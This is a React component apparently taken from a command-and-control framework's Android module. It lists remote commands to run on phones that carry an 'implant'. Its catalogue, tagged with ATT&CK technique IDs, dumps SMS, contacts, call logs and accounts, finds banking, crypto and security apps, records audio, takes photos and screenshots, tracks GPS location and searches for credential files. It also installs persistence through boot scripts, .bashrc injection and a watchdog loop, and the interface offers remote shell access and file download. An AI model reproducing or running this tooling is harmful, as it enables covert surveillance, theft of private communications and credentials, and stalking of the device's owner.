import { useState, useMemo } from 'react'
import { useAPI, apiPost, apiFetch } from '../hooks/useAPI'
import type { Session } from '../types'
import {
  Smartphone, RefreshCw, Terminal, FolderOpen, Send, Loader,
  Download, Copy, CheckCheck, ChevronRight, ChevronDown,
  Search, Hash, X,
} from 'lucide-react'

// ─── Types ────────────────────────────────────────────────────────────────────
interface ExecResult  { stdout: string; stderr: string; exit_code: number }
interface FileInfo    { name: string; is_dir: boolean; size: number; mod_time: number; mode?: string }
interface LsResp      { path: string; files: FileInfo[] }
interface Task        { id: number; cmd: string; result: string; ok: boolean; ts: number; open: boolean }

function fmtBytes(b: number) {
  if (b >= 1 << 20) return `${(b / (1 << 20)).toFixed(1)} MB`
  if (b >= 1024)    return `${(b / 1024).toFixed(1)} KB`
  return `${b} B`
}
function joinPath(base: string, name: string) { return base.replace(/\/+$/, '') + '/' + name }
function parentPath(p: string) {
  if (p === '/') return '/'
  const t = p.replace(/\/+$/, '')
  const i = t.lastIndexOf('/')
  return i <= 0 ? '/' : t.slice(0, i)
}

// ─── Command catalogue — Android 16 compatible ───────────────────────────────
// Rules:
//   • Always use 2>&1 (not 2>/dev/null) so errors surface as output
//   • No single quotes inside double quotes (breaks toybox sh)
//   • No complex awk patterns — use getprop / simpler tools
//   • Prefer getprop, pm, ip, dumpsys battery, settings get
//   • cmd wifi status instead of dumpsys wifi (Android 12+)

interface Cmd { icon: string; label: string; cmd: string; tag?: string; note?: string }
interface Cat { id: string; icon: string; label: string; atkId: string; cmds: Cmd[] }

const CATS: Cat[] = [
  {
    id: 'device', icon: '📱', label: 'DEVICE INFO', atkId: 'TA0007',
    cmds: [
      {
        icon: '📱', label: 'Model / Brand',
        cmd:  'getprop ro.product.model; getprop ro.product.brand; getprop ro.product.manufacturer; getprop ro.product.name',
        tag:  'T1082',
      },
      {
        icon: '🤖', label: 'Android Version',
        cmd:  'getprop ro.build.version.release; getprop ro.build.version.sdk; getprop ro.build.version.security_patch; getprop ro.build.id',
        tag:  'T1082',
      },
      {
        icon: '🔒', label: 'Security State',
        cmd:  'getprop ro.crypto.state; getprop ro.boot.verifiedbootstate; getprop ro.boot.flash.locked; getprop ro.debuggable; getprop ro.build.tags',
        tag:  'T1082',
      },
      {
        icon: '⚙️', label: 'Hardware / SoC',
        cmd:  'getprop ro.hardware; getprop ro.product.board; getprop ro.product.cpu.abi; getprop ro.product.cpu.abilist',
        tag:  'T1082',
      },
      {
        icon: '🔑', label: 'Android ID',
        cmd:  'settings get secure android_id 2>&1',
        tag:  'T1033',
      },
      {
        icon: '📟', label: 'SIM / Carrier',
        cmd:  'getprop gsm.operator.alpha; getprop gsm.network.type; getprop gsm.sim.state; getprop gsm.operator.iso-country',
        tag:  'T1033',
      },
      {
        icon: '🔋', label: 'Battery Status',
        cmd:  'dumpsys battery 2>&1',
        tag:  'T1082',
      },
      {
        icon: '🧠', label: 'Memory Info',
        cmd:  'cat /proc/meminfo 2>&1 | head -10',
        tag:  'T1082',
      },
      {
        icon: '⚡', label: 'CPU Info',
        cmd:  'cat /proc/cpuinfo 2>&1 | grep -i hardware | head -3; cat /proc/cpuinfo 2>&1 | grep -i processor | head -5',
        tag:  'T1082',
      },
      {
        icon: '💾', label: 'Storage Usage',
        cmd:  'df /sdcard /data /system 2>&1',
        tag:  'T1082',
      },
      {
        icon: '👤', label: 'Current UID / Context',
        cmd:  'id 2>&1; cat /proc/self/attr/current 2>&1; whoami 2>&1',
        tag:  'T1033',
      },
      {
        icon: '🌍', label: 'Locale / Language',
        cmd:  'getprop persist.sys.locale; getprop ro.product.locale; settings get system locale 2>&1',
        tag:  'T1082',
      },
      {
        icon: '📋', label: 'All getprop',
        cmd:  'getprop 2>&1',
        tag:  'T1082',
      },
      {
        icon: '🖥️', label: 'Display / Screen',
        cmd:  'wm size 2>&1; wm density 2>&1; settings get system screen_brightness 2>&1',
        tag:  'T1082',
      },
      {
        icon: '👤', label: 'Google Accounts',
        cmd:  'dumpsys account 2>&1 | head -60',
        tag:  'T1033',
        note: 'May be restricted on Android 14+',
      },
      {
        icon: '📍', label: 'Last Location (dumpsys)',
        cmd:  'dumpsys location 2>&1 | head -40',
        tag:  'T1430',
      },
    ],
  },
  {
    id: 'network', icon: '📡', label: 'NETWORK', atkId: 'TA0007',
    cmds: [
      {
        icon: '🌐', label: 'IP Addresses',
        cmd:  'ip addr show 2>&1',
        tag:  'T1016',
      },
      {
        icon: '🛤️', label: 'Routing Table',
        cmd:  'ip route show 2>&1',
        tag:  'T1016',
      },
      {
        icon: '🔌', label: 'DNS Servers',
        cmd:  'getprop net.dns1; getprop net.dns2; getprop dhcp.wlan0.dns1; getprop dhcp.wlan0.domain 2>&1',
        tag:  'T1016',
      },
      {
        icon: '📶', label: 'WiFi Status (cmd)',
        cmd:  'cmd wifi status 2>&1',
        tag:  'T1016',
        note: 'cmd wifi works on Android 11+',
      },
      {
        icon: '💾', label: 'WiFi Networks (settings)',
        cmd:  'settings get global wifi_on 2>&1; getprop wifi.interface 2>&1; cmd wifi list-networks 2>&1 | head -30',
        tag:  'T1016',
      },
      {
        icon: '🔗', label: 'Active Connections (/proc)',
        cmd:  'cat /proc/net/tcp 2>&1 | head -30; cat /proc/net/tcp6 2>&1 | head -20',
        tag:  'T1049',
      },
      {
        icon: '🔍', label: 'netstat / ss',
        cmd:  'netstat -an 2>&1 | head -40 || ss -an 2>&1 | head -40',
        tag:  'T1049',
      },
      {
        icon: '🏠', label: 'Hosts File',
        cmd:  'cat /system/etc/hosts 2>&1',
        tag:  'T1016',
      },
      {
        icon: '📊', label: 'Network Interface Stats',
        cmd:  'cat /proc/net/dev 2>&1',
        tag:  'T1016',
      },
      {
        icon: '📡', label: 'Bluetooth State',
        cmd:  'settings get global bluetooth_on 2>&1; getprop bluetooth.status 2>&1; cmd bluetooth_manager state 2>&1',
        tag:  'T1016',
      },
    ],
  },
  {
    id: 'apps', icon: '📦', label: 'APPS / PROCS', atkId: 'TA0007',
    cmds: [
      {
        icon: '📦', label: 'User-Installed Apps',
        cmd:  'pm list packages -3 2>&1',
        tag:  'T1518',
      },
      {
        icon: '⚙️', label: 'System Apps',
        cmd:  'pm list packages -s 2>&1 | head -60',
        tag:  'T1518',
      },
      {
        icon: '📂', label: 'App APK Paths',
        cmd:  'pm list packages -f -3 2>&1 | head -40',
        tag:  'T1518',
      },
      {
        icon: '🏃', label: 'Running Processes',
        cmd:  'ps -A 2>&1 | head -60 || ps 2>&1 | head -60',
        tag:  'T1057',
      },
      {
        icon: '🔄', label: 'Running Services',
        cmd:  'dumpsys activity services 2>&1 | head -50',
        tag:  'T1007',
      },
      {
        icon: '🕐', label: 'Recent Tasks',
        cmd:  'am stack list 2>&1 | head -30',
        tag:  'T1010',
      },
      {
        icon: '🔐', label: 'App Permissions',
        cmd:  'dumpsys package 2>&1 | grep uses-permission | sort -u | head -50',
        tag:  'T1422',
      },
      {
        icon: '🔍', label: 'Find Security Apps',
        cmd:  'pm list packages 2>&1 | grep -i "security\\|antivirus\\|av\\|protect\\|malware\\|kaspersky\\|norton\\|avast\\|bitdefender"',
        tag:  'T1518',
      },
      {
        icon: '🎯', label: 'Interesting Apps',
        cmd:  'pm list packages 2>&1 | grep -i "whatsapp\\|telegram\\|signal\\|viber\\|instagram\\|facebook\\|gmail\\|bank\\|pay\\|crypto\\|coinbase\\|binance"',
        tag:  'T1518',
      },
      {
        icon: '🌐', label: 'Browsers Installed',
        cmd:  'pm list packages 2>&1 | grep -i "chrome\\|firefox\\|opera\\|brave\\|browser\\|samsung.internet\\|duckduckgo"',
        tag:  'T1518',
      },
    ],
  },
  {
    id: 'comms', icon: '💬', label: 'COMMS', atkId: 'TA0009',
    cmds: [
      {
        icon: '📨', label: 'SMS Inbox',
        cmd:  'content query --uri content://sms/inbox --projection address:body:date 2>&1 | head -100',
        tag:  'T1636',
        note: 'Needs READ_SMS permission',
      },
      {
        icon: '📤', label: 'SMS Sent',
        cmd:  'content query --uri content://sms/sent --projection address:body:date 2>&1 | head -80',
        tag:  'T1636',
      },
      {
        icon: '📩', label: 'All SMS',
        cmd:  'content query --uri content://sms --projection address:body:date:type 2>&1 | head -150',
        tag:  'T1636',
      },
      {
        icon: '👥', label: 'Contacts',
        cmd:  'content query --uri content://contacts/phones/ --projection display_name:number 2>&1 | head -150',
        tag:  'T1636',
        note: 'Needs READ_CONTACTS permission',
      },
      {
        icon: '📞', label: 'Call Log',
        cmd:  'content query --uri content://call_log/calls --projection number:date:type:duration 2>&1 | head -80',
        tag:  'T1636',
        note: 'Needs READ_CALL_LOG permission',
      },
      {
        icon: '📬', label: 'MMS',
        cmd:  'content query --uri content://mms --projection date:msg_box 2>&1 | head -50',
        tag:  'T1636',
      },
      {
        icon: '📋', label: 'Clipboard (Termux:API)',
        cmd:  'termux-clipboard-get 2>&1 || echo needs-termux-api',
        tag:  'T1414',
      },
      {
        icon: '📸', label: 'WhatsApp Media Dir',
        cmd:  'ls /sdcard/WhatsApp/Media 2>&1 || ls /sdcard/Android/media/com.whatsapp/WhatsApp/Media 2>&1',
        tag:  'T1636',
      },
      {
        icon: '✈️', label: 'Telegram Downloads',
        cmd:  'ls /sdcard/Telegram 2>&1 || ls /sdcard/Android/data/org.telegram.messenger/files 2>&1',
        tag:  'T1636',
      },
    ],
  },
  {
    id: 'persist', icon: '🔒', label: 'PERSISTENCE', atkId: 'TA0003',
    cmds: [
      {
        icon: '🔍', label: 'Check Persistence Status',
        cmd:  'ps 2>&1 | grep phantom | grep -v grep; cat /data/data/com.termux/files/home/.termux/boot/phantom.sh 2>&1; grep phantom /data/data/com.termux/files/home/.bashrc 2>&1',
        tag:  'T1398',
      },
      {
        icon: '🔄', label: 'Start Watchdog Loop',
        cmd:  'nohup sh -c "while true; do /data/data/com.termux/files/home/phantom 2>/dev/null; sleep 15; done" > /dev/null 2>&1 & echo watchdog-started',
        tag:  'T1398',
      },
      {
        icon: '📦', label: 'Termux:Boot Script',
        cmd:  'mkdir -p /data/data/com.termux/files/home/.termux/boot && printf "#!/data/data/com.termux/files/usr/bin/sh\nnohup ~/phantom > /dev/null 2>&1 &\n" > /data/data/com.termux/files/home/.termux/boot/phantom.sh && chmod +x /data/data/com.termux/files/home/.termux/boot/phantom.sh && echo boot-script-installed',
        tag:  'T1398',
      },
      {
        icon: '🏃', label: 'Inject .bashrc',
        cmd:  'grep -q phantom /data/data/com.termux/files/home/.bashrc 2>/dev/null || echo "nohup ~/phantom > /dev/null 2>&1 &" >> /data/data/com.termux/files/home/.bashrc && echo bashrc-updated',
        tag:  'T1546',
      },
      {
        icon: '🧹', label: 'Remove All Persistence',
        cmd:  'pkill -f phantom 2>&1; rm -f /data/data/com.termux/files/home/.termux/boot/phantom.sh 2>&1; sed -i "/phantom/d" /data/data/com.termux/files/home/.bashrc 2>&1; echo removed',
        tag:  'T1070',
      },
    ],
  },
  {
    id: 'specops', icon: '🎯', label: 'SPEC OPS', atkId: 'TA0009',
    cmds: [
      {
        icon: '📍', label: 'GPS via Termux:API',
        cmd:  'termux-location --provider gps 2>&1 || echo needs-termux-api-app',
        tag:  'T1430',
      },
      {
        icon: '🗺️', label: 'Network Location',
        cmd:  'termux-location --provider network 2>&1 || dumpsys location 2>&1 | head -30',
        tag:  'T1430',
      },
      {
        icon: '🎙️', label: 'Record Audio 10s',
        cmd:  'termux-microphone-record -l 10 -f /sdcard/Download/rec.m4a 2>&1 && echo saved-to-sdcard || echo needs-termux-api',
        tag:  'T1429',
      },
      {
        icon: '📷', label: 'Take Photo',
        cmd:  'termux-camera-photo /sdcard/Download/photo.jpg 2>&1 && echo saved || echo needs-termux-api',
        tag:  'T1512',
      },
      {
        icon: '📸', label: 'Screenshot (screencap)',
        cmd:  'screencap -p /sdcard/Download/screenshot.png 2>&1 && echo saved-to-sdcard || echo failed',
        tag:  'T1513',
      },
      {
        icon: '📲', label: 'Send Test SMS',
        cmd:  'termux-sms-send -n 0 "test" 2>&1 || echo needs-termux-api',
        tag:  'T1582',
      },
      {
        icon: '🔑', label: 'Termux Keylog (bash history)',
        cmd:  'cat /data/data/com.termux/files/home/.bash_history 2>&1 | tail -50 || echo no-history',
        tag:  'T1417',
      },
      {
        icon: '💰', label: 'Find Cred Files',
        cmd:  'find /sdcard -name "*.json" -o -name "*.conf" -o -name "*.key" 2>&1 | grep -i "auth\\|token\\|cred\\|pass\\|secret" | head -30',
        tag:  'T1552',
      },
      {
        icon: '🌐', label: 'Device Fingerprint',
        cmd:  'echo === DEVICE === 2>&1; getprop ro.product.model; getprop ro.build.version.release; getprop ro.build.version.sdk; echo === NET ===; ip addr show | grep inet; echo === UID ===; id; echo === APPS ===; pm list packages -3 2>&1 | wc -l',
        tag:  'T1082',
      },
      {
        icon: '📡', label: 'WiFi Pivot Info',
        cmd:  'ip addr show 2>&1; echo === routes ===; ip route show 2>&1; echo === arp ===; cat /proc/net/arp 2>&1 | head -10',
        tag:  'T1090',
      },
    ],
  },
]

let _tid = 0

// ─── Component ────────────────────────────────────────────────────────────────
interface Props { onOpenTerminal: (id: string, name: string) => void }

export default function Android({ onOpenTerminal }: Props) {
  const { data, loading, error, refresh } = useAPI<Session[]>('/api/sessions', 6_000)
  const sessions = (data ?? []).filter(s =>
    s.os?.toLowerCase().includes('android') || s.arch?.toLowerCase().includes('arm')
  )

  const [selId,     setSelId]     = useState<string | null>(null)
  const [tasks,     setTasks]     = useState<Task[]>([])
  const [running,   setRunning]   = useState(false)
  const [custom,    setCustom]    = useState('')
  const [search,    setSearch]    = useState('')
  const [openCats,  setOpenCats]  = useState<Set<string>>(new Set(['device']))
  const [showFs,    setShowFs]    = useState(false)
  const [copied,    setCopied]    = useState<number | null>(null)
  const [fsPath,    setFsPath]    = useState('/sdcard')
  const [fsData,    setFsData]    = useState<LsResp | null>(null)
  const [fsLoading, setFsLoading] = useState(false)

  const sel = sessions.find(s => s.id === selId) ?? null

  async function exec(cmd: string, label: string) {
    if (!selId || running) return
    setRunning(true)
    const id = ++_tid
    try {
      const r = await apiPost<ExecResult>(`/api/sessions/${selId}/execute`, { command: cmd })
      // Always show output — if both empty show a hint
      const out = r.stdout || r.stderr
        ? (r.stdout || '') + (r.stderr ? '\n[stderr] ' + r.stderr : '')
        : '[no output — command ran but returned nothing. Try: ' + cmd.split(' ')[0] + ' --help]'
      setTasks(p => [{ id, cmd: label, result: out.slice(0, 8000), ok: r.exit_code === 0, ts: Date.now(), open: true }, ...p].slice(0, 100))
    } catch (e) {
      setTasks(p => [{ id, cmd: label, result: String(e), ok: false, ts: Date.now(), open: true }, ...p].slice(0, 100))
    } finally { setRunning(false) }
  }

  async function browseFs(path: string) {
    if (!selId) return
    setFsLoading(true)
    setShowFs(true)
    try {
      const ls = await apiFetch<LsResp>(`/api/sessions/${selId}/ls?path=${encodeURIComponent(path)}`)
      setFsPath(ls.path); setFsData(ls)
    } catch (e) {
      exec('ls -la ' + path, 'ls ' + path)
      setShowFs(false)
    } finally { setFsLoading(false) }
  }

  function downloadFile(path: string) {
    if (!selId) return
    window.open(`/api/sessions/${selId}/download?path=${encodeURIComponent(path)}`, '_blank')
  }

  function copy(id: number, text: string) {
    navigator.clipboard.writeText(text).then(() => { setCopied(id); setTimeout(() => setCopied(null), 1500) })
  }

  function toggleTask(id: number) {
    setTasks(p => p.map(t => t.id === id ? { ...t, open: !t.open } : t))
  }

  function toggleCat(id: string) {
    setOpenCats(prev => { const s = new Set(prev); s.has(id) ? s.delete(id) : s.add(id); return s })
  }

  const filteredCats = useMemo(() => {
    const q = search.trim().toLowerCase()
    if (!q) return CATS
    return CATS.map(c => ({ ...c, cmds: c.cmds.filter(cmd => cmd.label.toLowerCase().includes(q)) })).filter(c => c.cmds.length > 0)
  }, [search])

  const fsFiles = (fsData?.files ?? []).filter(f => f.name !== '.' && f.name !== '..')

  return (
    <div className="flex h-full overflow-hidden rounded-lg border border-border bg-bg font-mono">

      {/* ══ COL 1 — Session List ══════════════════════════════════════════════ */}
      <aside className="w-48 shrink-0 flex flex-col border-r border-border" style={{ background: '#090909' }}>
        <div className="flex items-center justify-between px-3 py-2.5 border-b border-border">
          <span className="text-[10px] font-bold tracking-widest text-muted uppercase">Android</span>
          <button onClick={refresh} className="text-muted hover:text-primary transition-colors">
            <RefreshCw size={11} className={loading ? 'animate-spin' : ''} />
          </button>
        </div>
        <div className="flex-1 overflow-y-auto">
          {!loading && sessions.length === 0 && (
            <div className="p-4 text-center space-y-1">
              <Smartphone size={20} className="text-border mx-auto" />
              <p className="text-muted text-[10px]">No Android sessions</p>
              <p className="text-muted text-[9px]">Deploy implant first</p>
            </div>
          )}
          {sessions.map(s => {
            const active = s.id === selId
            return (
              <button key={s.id}
                onClick={() => { setSelId(s.id); setTasks([]); setShowFs(false); setFsPath('/sdcard'); setFsData(null) }}
                className={`w-full text-left px-3 py-2.5 border-b border-border/20 transition-all group ${active ? 'bg-primary/8 border-l-2 border-l-primary' : 'hover:bg-white/4'}`}>
                <div className="flex items-center gap-1.5 mb-1">
                  <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${s.is_dead ? 'bg-danger' : active ? 'bg-primary animate-pulse' : 'bg-muted'}`} />
                  <span className={`text-[11px] font-semibold truncate ${active ? 'text-text' : 'text-muted group-hover:text-text'}`}>{s.name || s.hostname}</span>
                </div>
                <div className="pl-3 space-y-0.5">
                  <div className="text-[9px] text-muted truncate">{s.username}</div>
                  <div className="text-[9px] text-muted truncate">{s.remote_address}</div>
                  <div className={`text-[9px] truncate ${active ? 'text-primary/70' : 'text-muted/60'}`}>{s.os} · {s.arch}</div>
                </div>
              </button>
            )
          })}
        </div>
        {error && <p className="px-2 py-1 text-[9px] text-danger">{error}</p>}
      </aside>

      {/* ══ COL 2 — Command Palette ══════════════════════════════════════════ */}
      {selId && (
        <div className="w-56 shrink-0 flex flex-col border-r border-border" style={{ background: '#0b0b0b' }}>

          {/* Target info */}
          <div className="px-3 py-2 border-b border-border">
            <div className="flex items-center justify-between">
              <span className="text-[9px] font-bold text-primary tracking-widest uppercase">Target</span>
              <button onClick={() => onOpenTerminal(selId, sel?.name || sel?.hostname || '')}
                className="flex items-center gap-1 text-muted hover:text-primary text-[9px] transition-colors">
                <Terminal size={9} /> Shell
              </button>
            </div>
            <div className="text-[10px] text-text font-semibold mt-0.5 truncate">{sel?.name || sel?.hostname}</div>
            <div className="text-[9px] text-muted truncate">{sel?.os} · {sel?.arch}</div>
          </div>

          {/* Search */}
          <div className="px-2 py-1.5 border-b border-border">
            <div className="flex items-center gap-1.5 bg-bg/60 border border-border rounded px-2 py-1">
              <Search size={10} className="text-muted shrink-0" />
              <input value={search} onChange={e => setSearch(e.target.value)} placeholder="filter modules…"
                className="flex-1 bg-transparent text-[10px] text-text placeholder-muted/60 outline-none min-w-0" />
              {search && <button onClick={() => setSearch('')} className="text-muted hover:text-text shrink-0"><X size={9} /></button>}
            </div>
          </div>

          {/* Category accordion */}
          <div className="flex-1 overflow-y-auto">
            {filteredCats.map(cat => {
              const open = openCats.has(cat.id) || !!search.trim()
              return (
                <div key={cat.id}>
                  <button onClick={() => !search.trim() && toggleCat(cat.id)}
                    className="w-full flex items-center gap-1.5 px-3 py-1.5 hover:bg-white/4 transition-colors group">
                    <span className="text-xs">{cat.icon}</span>
                    <span className="flex-1 text-[9px] font-bold tracking-widest text-muted group-hover:text-text uppercase text-left">{cat.label}</span>
                    <span className="text-[8px] text-muted/60 font-mono">{cat.atkId}</span>
                    {open ? <ChevronDown size={9} className="text-muted shrink-0" /> : <ChevronRight size={9} className="text-muted shrink-0" />}
                  </button>
                  {open && cat.cmds.map(c => (
                    <button key={c.label} disabled={running} onClick={() => exec(c.cmd, c.label)}
                      className="w-full flex items-start gap-2 px-4 py-1.5 hover:bg-primary/8 transition-colors group disabled:opacity-40 text-left">
                      <span className="text-[11px] shrink-0 mt-0.5">{c.icon}</span>
                      <div className="flex-1 min-w-0">
                        <div className="text-[10px] text-muted group-hover:text-text transition-colors truncate">{c.label}</div>
                        {c.note && <div className="text-[8px] text-muted/50 truncate">{c.note}</div>}
                      </div>
                      {c.tag && <span className="text-[8px] text-muted/40 font-mono shrink-0 mt-0.5">{c.tag}</span>}
                    </button>
                  ))}
                </div>
              )
            })}
          </div>

          {/* Custom command + file browser */}
          <div className="shrink-0 border-t border-border">
            <div className="flex items-center gap-1.5 px-2.5 py-2 border-b border-border/50">
              <span className="text-muted text-[10px] font-bold select-none shrink-0">$</span>
              <input value={custom} onChange={e => setCustom(e.target.value)}
                onKeyDown={e => { if (e.key === 'Enter' && custom.trim()) { exec(custom.trim(), custom.trim()); setCustom('') } }}
                placeholder="custom command…"
                className="flex-1 bg-transparent text-[10px] text-text placeholder-muted/50 outline-none font-mono min-w-0" />
              <button onClick={() => { if (custom.trim()) { exec(custom.trim(), custom.trim()); setCustom('') } }}
                disabled={running || !custom.trim()} className="text-muted hover:text-primary disabled:opacity-30 shrink-0">
                {running ? <Loader size={10} className="animate-spin" /> : <Send size={10} />}
              </button>
            </div>
            <button onClick={() => browseFs(fsPath)}
              className={`w-full flex items-center gap-2 px-3 py-2 text-[10px] transition-colors ${showFs ? 'bg-primary/10 text-primary' : 'text-muted hover:text-text hover:bg-white/4'}`}>
              <FolderOpen size={11} /> File Browser (/sdcard)
            </button>
          </div>
        </div>
      )}

      {/* ══ COL 3 — Task Output / File Browser ══════════════════════════════ */}
      {selId ? (
        <div className="flex-1 flex flex-col min-w-0 min-h-0">
          {showFs ? (
            /* ── File Browser ──────────────────────────────────────────────── */
            <div className="flex-1 flex flex-col min-h-0">
              <div className="shrink-0 flex items-center gap-2 px-3 py-2 border-b border-border bg-surface/40">
                <FolderOpen size={11} className="text-primary shrink-0" />
                <span className="text-[10px] text-muted font-mono flex-1 truncate">{fsPath}</span>
                <button onClick={() => browseFs(parentPath(fsPath))} className="text-muted hover:text-text text-[10px] flex items-center gap-1 shrink-0">
                  <ChevronRight size={10} className="rotate-180" /> Up
                </button>
                <button onClick={() => browseFs(fsPath)} className="text-muted hover:text-primary shrink-0">
                  <RefreshCw size={10} className={fsLoading ? 'animate-spin' : ''} />
                </button>
                <button onClick={() => setShowFs(false)} className="text-muted hover:text-text shrink-0"><X size={10} /></button>
              </div>
              <div className="flex-1 overflow-y-auto text-[11px]">
                {fsLoading
                  ? <div className="flex items-center justify-center p-8"><Loader size={16} className="text-muted animate-spin" /></div>
                  : fsFiles.length === 0
                  ? <div className="p-4 text-muted text-center text-xs">Empty or inaccessible</div>
                  : fsFiles.map(f => (
                    <div key={f.name} className="flex items-center gap-2 px-3 py-1.5 border-b border-border/20 hover:bg-white/3 group">
                      <span className="shrink-0">{f.is_dir ? '📁' : '📄'}</span>
                      <button onClick={() => f.is_dir && browseFs(joinPath(fsPath, f.name))}
                        className={`flex-1 text-left truncate text-[10px] ${f.is_dir ? 'text-accent hover:text-primary cursor-pointer' : 'text-text cursor-default'}`}>
                        {f.name}
                      </button>
                      {!f.is_dir && <span className="text-[9px] text-muted shrink-0 tabular-nums">{fmtBytes(f.size)}</span>}
                      {!f.is_dir && (
                        <button onClick={() => downloadFile(joinPath(fsPath, f.name))}
                          className="text-muted hover:text-primary opacity-0 group-hover:opacity-100 transition-all shrink-0" title="Download">
                          <Download size={10} />
                        </button>
                      )}
                    </div>
                  ))}
              </div>
            </div>
          ) : (
            /* ── Task History ──────────────────────────────────────────────── */
            <div className="flex-1 flex flex-col min-h-0">
              <div className="shrink-0 flex items-center justify-between px-4 py-2 border-b border-border bg-surface/30">
                <div className="flex items-center gap-2">
                  <Hash size={11} className="text-muted" />
                  <span className="text-[10px] text-muted font-semibold uppercase tracking-wider">Task History</span>
                  {tasks.length > 0 && <span className="text-[9px] bg-border/60 text-muted px-1.5 py-0.5 rounded-full">{tasks.length}</span>}
                  {running && <Loader size={10} className="text-primary animate-spin" />}
                </div>
                {tasks.length > 0 && <button onClick={() => setTasks([])} className="text-[9px] text-muted hover:text-danger transition-colors">Clear</button>}
              </div>

              <div className="flex-1 overflow-y-auto p-3 space-y-2">
                {tasks.length === 0 ? (
                  <div className="flex flex-col items-center justify-center h-full gap-3 text-center py-16">
                    <div className="w-10 h-10 rounded-full border border-border flex items-center justify-center">
                      <Smartphone size={18} className="text-border" />
                    </div>
                    <div className="text-muted text-xs">No tasks yet</div>
                    <div className="text-muted/60 text-[10px] max-w-xs leading-relaxed">
                      Select a module from the left panel.<br/>
                      All commands use <span className="text-accent">2&gt;&amp;1</span> — errors will show as output.
                    </div>
                  </div>
                ) : tasks.map((t, i) => (
                  <div key={t.id} className={`border rounded overflow-hidden ${t.ok ? 'border-border/60' : 'border-warn/30'}`}>
                    <button onClick={() => toggleTask(t.id)}
                      className={`w-full flex items-center gap-2.5 px-3 py-2 text-left transition-colors ${t.ok ? 'bg-surface/60 hover:bg-surface' : 'bg-warn/5 hover:bg-warn/8'}`}>
                      <span className="text-[9px] text-muted/50 font-mono shrink-0 tabular-nums">#{String(tasks.length - i).padStart(2, '0')}</span>
                      <span className={`shrink-0 rounded px-1.5 py-0.5 text-[8px] font-bold tracking-wider ${t.ok ? 'bg-primary/15 text-primary' : 'bg-warn/20 text-warn'}`}>
                        {t.ok ? 'OK' : 'WARN'}
                      </span>
                      <span className="flex-1 text-[10px] text-text font-semibold truncate">{t.cmd}</span>
                      <span className="text-[9px] text-muted shrink-0 tabular-nums">{new Date(t.ts).toLocaleTimeString()}</span>
                      <button onClick={e => { e.stopPropagation(); copy(t.id, t.result) }} className="text-muted hover:text-primary shrink-0 transition-colors">
                        {copied === t.id ? <CheckCheck size={10} /> : <Copy size={10} />}
                      </button>
                      {t.open ? <ChevronDown size={10} className="text-muted shrink-0" /> : <ChevronRight size={10} className="text-muted shrink-0" />}
                    </button>
                    {t.open && (
                      <pre className="px-4 py-3 text-[10px] text-text/90 whitespace-pre-wrap break-all leading-relaxed max-h-72 overflow-y-auto bg-bg/80 border-t border-border/30">
                        {t.result}
                      </pre>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      ) : (
        <div className="flex-1 flex flex-col items-center justify-center gap-4 p-8 text-center">
          <div className="w-14 h-14 rounded-full border border-border flex items-center justify-center">
            <Smartphone size={24} className="text-border" />
          </div>
          <div>
            <div className="text-muted text-sm font-semibold mb-1">No device selected</div>
            <div className="text-muted/60 text-xs max-w-xs leading-relaxed">
              Connect an Android implant, then select the device from the session list
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
